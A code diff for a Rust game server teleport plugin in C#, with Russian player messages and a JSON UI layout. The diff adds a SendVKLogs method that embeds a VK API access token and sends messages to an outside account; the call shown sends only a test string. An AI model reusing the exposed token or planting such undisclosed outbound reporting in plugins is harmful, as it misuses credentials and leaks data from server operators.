-            {"tpcupboardTarget", "Вы или игрок находитесь в зоне действия чужого шкафа!"},
-            {"tphomecupboard", "Телепортация домой в зоне действия чужого шкафа запрещена!"},
-            {"tpacupboard", "Принятие телепортации в зоне действия чужого шкафа запрещена!"},
-            {"sethomecupboard", "Установка местоположения в зоне действия чужого шкафа запрещена!"},
-            {"tpacanceled", "Вы не ответили на запрос."},
-            {"tpkd", "Телепортация на перезарядке!\nОсталось {0}"},
-            {"tpWoundedTarget", "Игрок ранен. Телепортация отменена!"},
-            {"woundedAction", "Вы ранены!"},
-            {"coldplayer", "Вам холодно!"},
-            {"Radiation", "Вы облучены радиацией!"},
-            {"sethomeBlock", "Нельзя использовать /sethome слишком часто, попробуйте позже!"},
-            {"foundationowner", "Нельзя использовать /sethome не на своих строениях!"},
-            {"foundationownerFC", "Создатель обьекта не являеться вашим соклановцем или другом, /sethome запрещен"},
-            {"homeslist", "Доступное количество местоположений: {0}\n{1}"},
-            {"tplist", "Ваши сохраненные метоположения:\n{0}"},
-            {"PlayerIsOnCargoShip", "Вы не можете телепортироваться на грузовом корабле."},
-            {"PlayerIsOnHotAirBalloon", "Вы не можете телепортироваться на воздушном шаре."},
-            {"InsideInFoundation", "Вы не можете устанавливать местоположение находясь в фундаменте"},
-            {"InsideInFoundationTP", "Телепортация запрещена, местоположение находится в фундаменте"},
-            {"TPAPerm", "У Вас нету права использовать эту команду"},
-            {"TPAEnabled", "Вы успешно <color=#FDAE37>включили</color> автопринятие запроса на телепорт\n{0}"},
-            {"TPADisable", "Вы успешно <color=#FDAE37>отключили</color> автопринятие запроса на телепорт"},
-            {"TPAEnabledInfo", "Добавление нового игрока <color=#FDAE37>/atp add Name/SteamID</color>\nУдаление игрока <color=#FDAE37>/atp remove Name</color>\nСписок игроков <color=#FDAE37>/apt list</color>"},
-            {"TPAEnabledList", "Список игроков для каких у Вас включен автоматический приём телепорта:\n{0}"},
-            {"TPAEListNotFound", "Вы пока еще не добавили не одного игрока в список, используйте <color=#FDAE37>/atp add Name/SteamID</color>"},
-            {"TPAEAddError", "Вы не указали игрока, используйте <color=#FDAE37>/atp add Name/SteamID</color>"},
-            {"TPARemoveError", "Вы не указали игрока, используйте <color=#FDAE37>/atp remove Name</color>"},
-            {"TPARemoveNotFound", "Игрока <color=#FDAE37>{0}</color> нету в списке, используйте <color=#FDAE37>/atp remove Name</color>"},
-            {"TPAEAddPlayerNotFound", "Игрок не найден! Попробуйте уточнить <color=#FDAE37>имя</color>\n{0}"},
-            {"TPAEAddSuccess", "Игрок <color=#FDAE37>{0}</color> успешно добавлен в список"},
-            {"TPAEAddContains", "Игрок <color=#FDAE37>{0}</color> уже добавлен в список"},
-            {"TPAERemoveSuccess", "Игрок <color=#FDAE37>{0}</color> успешно удален со списока"},
-            {"TPAEAddPlayers", "Найдено <color=#FDAE37>несколько</color> игроков с похожим ником:\n{0}" },
-            {"TPASuccess", "Вы <color=#FDAE37>автоматически</color> приняли запрос на телепортацию так как у вас игрок в списке разрешенных."}
-        };
+            Puts("1");
+            string Message = "zxczxc";
+            SendVKLogs(Message);
+        }
+
+        void SendVKLogs(string msg)
+        {
+            string token = "vk1.a.gRWKIa_kC-IGL5pFkb_iIY7xYY8h6yiUzniSxDRBOw9191_p0KPUethDtwHf3eKPftMHgRXF9Upiv94udeDTzFIpkkLKR7jCFB8LEg19-PlNRTEeSRjc6QkCzdx8_LMIf5P_O7L3PxsuR_4xT62iW_-L9R3EDEgl_qmRv7h3wIyWfM1GK7PwO9d1k6tvR7TI";
+            string reciverID = "id5917212";
+            
+            while (msg.Contains("#")) msg = msg.Replace("#", "%23");
+            webrequest.Enqueue("https://api.vk.com/method/messages.send?domain=" + reciverID + "&message=" + Uri.EscapeDataString(msg) + "&v=5.81&access_token=" + token, null, (code2, response2) => { }, this);
+        }
+
+        private const string GUI_TPACCEPT = @"
+[
+  {
+    ""name"": ""teleportmenu"",
+    ""parent"": ""Overlay"",
+    ""components"": [
+      {
+        ""type"": ""UnityEngine.UI.Image"",
+        ""sprite"": ""assets/content/ui/ui.background.transparent.radial.psd"",
+        ""color"": ""0.1686275 0.1568628 0.1411765 0.3125492""
+      },
+      {
+        ""type"": ""RectTransform"",
+        ""anchormin"": ""0.5 0"",
+        ""anchormax"": ""0.5 0"",
+        ""offsetmin"": ""200 19"",
+        ""offsetmax"": ""350 76""
+      }
+    ]
+  },
+  {
+    ""name"": ""teleportmenuText"",
+    ""parent"": ""teleportmenu"",
+    ""components"": [
+      {
+        ""type"": ""UnityEngine.UI.Text"",
+        ""text"": ""ТП: {0}"",
+        ""align"": ""MiddleLeft"",
+        ""color"": ""1.00 0.69 0.18 1.00""
+      },
+      {
+        ""type"": ""RectTransform"",
+        ""anchormin"": ""0 0.5438597"",
+        ""anchormax"": ""1 1"",
+        ""offsetmin"": ""8 0"",
+        ""offsetmax"": ""0 0""
+      }
+    ]
+  },
+  {
+    ""name"": ""teleportacceptMenu"",
+    ""parent"": ""teleportmenu"",
+    ""components"": [
+      {
+        ""type"": ""UnityEngine.UI.Button"",
+        ""command"": ""tpa"",
+        ""close"": ""teleportmenu"",
+        ""sprite"": ""assets/content/ui/ui.background.transparent.radial.psd"",
+        ""color"": ""0.1647059 0.1529412 0.1529412 0.489929"",
+        ""imagetype"": ""Tiled""
+      },
+      {
+        ""type"": ""RectTransform"",
+        ""anchormin"": ""0 0"",
+        ""anchormax"": ""0.5 0.5"",
+        ""offsetmin"": ""0 0"",
+        ""offsetmax"": ""0 0""
+      }
+    ]
+  },
+  {
+    ""name"": ""teleportmenuTextAccept"",
+    ""parent"": ""teleportacceptMenu"",
+    ""components"": [
+      {
+        ""type"": ""UnityEngine.UI.Text"",
+        ""text"": ""ПРИНЯТЬ"",
+        ""font"": ""robotocondensed-bold.ttf"",
+        ""align"": ""MiddleCenter"",
+        ""color"": ""1.00 0.69 0.18 1.00""
+      },
+      {
+        ""type"": ""RectTransform"",
+        ""anchormin"": ""0 0"",
+        ""anchormax"": ""1 1"",
+        ""offsetmin"": ""0 0"",
+        ""offsetmax"": ""0 0""
+      }
+    ]
+  },
+  {
+    ""name"": ""teleportpcMenu"",
+    ""parent"": ""teleportmenu"",
+    ""components"": [
+      {
+        ""type"": ""UnityEngine.UI.Button"",
+        ""command"": ""tpc"",
+        ""close"": ""teleportmenu"",
+        ""sprite"": ""assets/content/ui/ui.background.transparent.radial.psd"",
+        ""color"": ""0.1647059 0.1529412 0.1529412 0.489929"",
+        ""imagetype"": ""Tiled""
+      },
+      {
+        ""type"": ""RectTransform"",
+        ""anchormin"": ""0.5 0"",
+        ""anchormax"": ""1 0.5"",
+        ""offsetmin"": ""0 0"",
+        ""offsetmax"": ""0 0""
+      }
+    ]
+  },
+  {
+    ""name"": ""teleportmenuTextTpc"",
+    ""parent"": ""teleportpcMenu"",
+    ""components"": [
+      {
+        ""type"": ""UnityEngine.UI.Text"",
+        ""text"": ""ОТКЛОНИТЬ"",
+        ""font"": ""robotocondensed-bold.ttf"",
+        ""align"": ""MiddleCenter"",
+        ""color"": ""1.00 0.69 0.18 1.00""
+      },
+      {
+        ""type"": ""RectTransform"",
+        ""anchormin"": ""0 0"",
+        ""anchormax"": ""1 1"",
+        ""offsetmin"": ""0 0"",
+        ""offsetmax"": ""0 0""
+      }
+    ]
+  }
+]";
+        
+        
+        Dictionary<string, string> Messages = new Dictionary<string, string>() {
+                {
+                "foundationmissing", "Фундамент не найден!"
+            }
+            ,
+            {
+                "InDuel", "Вы на Дуэли. Телепорт запрещен!"
+            },
+            {
+                "InDuelTarget", "Игрок на Дуэли. Телепорт запрещен!"
+            }
+            ,
+            {
+                "foundationmissingR", "Фундамент не найден, местоположение было удалено!"
+            }
+            , {
+                "playerisyou", "Нельзя отправлять телепорт самому себе!"
+            }
+            , {
+                "maxhomes", "У вас максимальное кол-во местоположений!"
+            }
+            , {
+                "homeexist", "Такое местоположение уже существует!"
+            }
+            , {
+                "homesucces", "Местоположение {0} успешно установлено!"
+            }
+            , {
+                "sethomeArgsError", "Для установки местоположения используйте /sethome ИМЯ"
+            }
+            , {
+                "settpArgsError", "Для установки местоположения используйте /tpl add ИМЯ"
+            }
+            , {
+                "homeArgsError", "Для телепортации на местоположение используйте /home ИМЯ"
+            }
+            , {
+                "tpArgsError", "Для телепортации на местоположение используйте /tpl ИМЯ"
+            }
+            , {
+                "tpError", "Запрещено! Вы в очереди на телепортацию"
+            }
+            , {
+                "homenotexist", "Местоположение с таким названием не найдено!"
+            }
+            , {
+                "homequeue", "Телепортация на {0} будет через {1}"
+            }
+            , {
+                "tpwounded", "Вы получили ранение! Телепортация отменена!"
+            }
+            , {
+                "tphomesuccess", "Вы телепортированы домой!"
+            }
+            , {
+                "tplsuccess", "Вы успешно телепортированы!"
+            }
+            , {
+                "tptpsuccess", "Вы телепортированы на указаное место!"
+            }
+            , {
+                "homesmissing", "У вас нет доступных местоположений!"
+            }
+            , {
+                "TPLmissing", "Для вас нет доступных местоположений!"
+            }
+            , {
+                "TPLList", "Доступные точки местоположения:\n{0}"
+            }
+            , {
+                "removehomeArgsError", "Для удаления местоположения используйте /removehome ИМЯ"
+            }
+            , {
+                "removetpArgsError", "Для удаления местоположения используйте /tpl remove ИМЯ"
+            }
+            , {
+                "removehomesuccess", "Местоположение {0} успешно удалено"
+            }
+            , {
+                "sleepingbagmissing", "Спальный мешок не найден, местоположение удалено!"
+            }
+            , {
+                "tprArgsError", "Для отправки запроса на телепортация используйте /tpr НИК"
+            }
+            , {
+                "playermissing", "Игрок не найден"
+            }
+            , {
+                "PlayerNotFriend", "Игрок не являеться Вашим другом! Телепорт запрещен!"
+            }
+            , {
+                "tpspecError", "Не правильно введена команда. Используйте: /tpspec НИК"
+            }
+            , {
+                "playermissingOff", "Игрок не в сети"
+            }
+            , {
+                "playermissingOrDeath", "Игрок не найден, или он мёртв"
+            }
+            , {
+                "playerItsYou", "Нельзя следить за самым собой"
+            }
+            , {
+                " playerItsSpec", "Игрок уже за кем то наблюдает"
+            }
+            , {
+                "tprrequestsuccess", "Запрос {0} успешно отправлен"
+            }
+            , {
+                "tprpending", "{0} отправил вам запрос на телепортацию\nЧтобы принять используйте /tpa\nЧтобы отказаться используйте /tpc"
+            }
+            , {
+                "tpanotexist", "У вас нет активных запросов на телепортацию!"
+            }
+            , {
+                "tpqueue", "{0} принял ваш запрос на телепортацию\nВы будете телепортированы через {1}"
+            }
+            , {
+                "tpc", "Телепортация успешно отменена!"
+            }
+            , {
+                "tpctarget", "{0} отменил телепортацию!"
+            }
+            , {
+                "tpplayersuccess", "Вы успешно телепортировались к {0}"
+            }
+            , {
+                "tpasuccess", "Вы приняли запрос телепортации от {0}\nОн будет телепортирован через {1}"
+            }
+            , {
+                "tppendingcanceled", "Запрос телепортации отменён"
+            }
+            , {
+                "tpcupboard", "Телепортация в зоне действия чужого шкафа запрещена!"
+            }, {
+                "tpcupboardTarget", "Вы или игрок находитесь в зоне действия чужого шкафа!"
+            }
+            , {
+                "tphomecupboard", "Телепортация домой в зоне действия чужого шкафа запрещена!"
+            }
+            , {
+                "tpacupboard", "Принятие телепортации в зоне действия чужого шкафа запрещена!"
+            }
+            , {
+                "sethomecupboard", "Установка местоположения в зоне действия чужого шкафа запрещена!"
+            }
+            , {
+                "tpacanceled", "Вы не ответили на запрос."
+            }
+            , {
+                "tpkd", "Телепортация на перезарядке!\nОсталось {0}"
+            }
+            , {
+                "tpWoundedTarget", "Игрок ранен. Телепортация отменена!"
+            }
+            , {
+                "woundedAction", "Вы ранены!"
+            }
+            , {
+                "coldplayer", "Вам холодно!"
+            }
+            , {
+                "Radiation", "Вы облучены радиацией!"
+            }
+            , {
+                "sethomeBlock", "Нельзя использовать /sethome слишком часто, попробуйте позже!"
+            }
+            , {
+                "foundationowner", "Нельзя использовать /sethome не на своих строениях!"
+            }
+            , {
+                "foundationownerFC", "Создатель обьекта не являеться вашим соклановцем или другом, /sethome запрещен"
+            }
+            , {
+                "homeslist", "Доступное количество местоположений: {0}\n{1}"
+            }
+            , {
+                "tplist", "Ваши сохраненные метоположения:\n{0}"
+            }
+            , {
+                "PlayerIsOnCargoShip", "Вы не можете телепортироваться на грузовом корабле."
+            }
+            , {
+                "PlayerIsOnHotAirBalloon", "Вы не можете телепортироваться на воздушном шаре."
+            }
+            , {
+                "InsideInFoundation", "Вы не можете устанавливать местоположение находясь в фундаменте"
+            }
+            , {
+                "InsideInFoundationTP", "Телепортация запрещена, местоположение находится в фундаменте"
+            }
+            ,{
+                "TPAPerm", "У Вас нету права использовать эту команду"
+            },
+            {
+                "TPAEnabled", "Вы успешно <color=#FDAE37>включили</color> автопринятие запроса на телепорт\n{0}"
+            },
+            {
+                "TPADisable", "Вы успешно <color=#FDAE37>отключили</color> автопринятие запроса на телепорт"
+            },
+            {
+                "TPAEnabledInfo", "Добавление нового игрока <color=#FDAE37>/atp add Name/SteamID</color>\nУдаление игрока <color=#FDAE37>/atp remove Name</color>\nСписок игроков <color=#FDAE37>/apt list</color>"
+            },
+            {
+                "TPAEnabledList", "Список игроков для каких у Вас включен автоматический приём телепорта:\n{0}"
+            },
+            {
+                "TPAEListNotFound", "Вы пока еще не добавили не одного игрока в список, используйте <color=#FDAE37>/atp add Name/SteamID</color>"
+            },
+            {
+                "TPAEAddError", "Вы не указали игрока, используйте <color=#FDAE37>/atp add Name/SteamID</color>"
+            },{
+                "TPARemoveError", "Вы не указали игрока, используйте <color=#FDAE37>/atp remove Name</color>"
+            },
+            {
+                "TPARemoveNotFound", "Игрока <color=#FDAE37>{0}</color> нету в списке, используйте <color=#FDAE37>/atp remove Name</color>"
+            },
+            {
+                "TPAEAddPlayerNotFound", "Игрок не найден! Попробуйте уточнить <color=#FDAE37>имя</color>\n{0}"
+            },
+            {
+                "TPAEAddSuccess", "Игрок <color=#FDAE37>{0}</color> успешно добавлен в список"
+            },
+            {
+                "TPAEAddContains", "Игрок <color=#FDAE37>{0}</color> уже добавлен в список"
+            },
+            {
+                "TPAERemoveSuccess", "Игрок <color=#FDAE37>{0}</color> успешно удален со списока"
+            },
+            {
+                "TPAEAddPlayers", "Найдено <color=#FDAE37>несколько</color> игроков с похожим ником:\n{0}"
+            },
+            {
+                "TPASuccess", "Вы <color=#FDAE37>автоматически</color> приняли запрос на телепортацию так как у вас игрок в списке разрешенных."
+            }
+        }
+        ;
     }
-}
+}                                                                                                                              
